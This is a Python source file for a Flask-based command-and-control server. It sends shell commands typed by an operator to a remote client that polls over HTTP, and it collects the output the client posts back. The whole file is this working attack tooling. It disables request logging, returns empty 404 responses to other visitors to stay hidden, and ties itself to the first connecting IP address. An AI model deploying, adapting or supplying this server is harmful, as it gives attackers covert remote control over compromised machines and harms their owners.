#!/usr/bin/env python3
__author__ = 'Jon Stratton'
import threading, logging, time
from flask import Flask, request, redirect

app = Flask(__name__)
log = logging.getLogger('werkzeug') # Turns off Logging
log.setLevel(logging.ERROR)

host = '0.0.0.0'
port = '5000'
connection_timeout = 20
command_timeout = 10

class RemoteConnection:
    def __init__(self):
        self.command = ''
        self.command_sent = 0
        self.response = ''
        self.ip = ''
        self.last_seen = 0
        self._lock = threading.Lock()
    def set_command(self, new_command):
        with self._lock:
            self.command = new_command
            self.command_sent = time.time()
    def set_response(self, new_response):
        with self._lock:
            self.response = new_response
    def set_ip(self, new_ip):
        with self._lock:
            self.ip = new_ip
    def update_last_seen(self):
        with self._lock:
            self.last_seen = time.time()
    def zero_last_seen(self):
        with self._lock:
            self.last_seen = 0

# Loop to get shell commands
def user_input(remoteConnection):
    while 1:
        if remoteConnection.ip:
           print('New Connection from %s' % remoteConnection.ip)
           while ( (remoteConnection.last_seen + connection_timeout) > time.time() ):
               new_command = input("%s>" % remoteConnection.ip)
               remoteConnection.set_command(new_command)
               # Wait for a response or a timeout here before looping
               while ( (not remoteConnection.response) and ((remoteConnection.command_sent + command_timeout) > time.time()) ):
                   time.sleep(1)
               if (remoteConnection.response):
                   print(remoteConnection.response)
                   remoteConnection.set_response('')
           # Clear the connection here
           print('%s timed out. Waiting for a new Connection.' % remoteConnection.ip)
           remoteConnection.set_ip('')
           remoteConnection.zero_last_seen()
        else:
           time.sleep(5)

@app.errorhandler(404)
def page_not_found(e):
    return '', 404

# GET gets a command, POST returns a result
@app.route("/", methods=['GET', 'POST'])
def new_action():
    returned_command = ''

    if not remoteConnection.ip:
        remoteConnection.set_ip(request.remote_addr)

    # Fake session based on IP. Could be an issue. Remove if you just want to talk to the last thing connecting.
    if remoteConnection.ip != request.remote_addr:
        return '', 404

    remoteConnection.update_last_seen()
    remoteConnection.set_ip(request.remote_addr)

    if request.method == 'POST' and request.get_data():
        remoteConnection.set_response(request.get_data().decode('utf-8'))
    else:
        returned_command = remoteConnection.command
        remoteConnection.set_command('')
    return returned_command

if __name__ == "__main__":
    remoteConnection = RemoteConnection()
    x = threading.Thread(target=user_input, args=(remoteConnection,))
    x.start()
    app.run(host=host, port=port, debug=False)
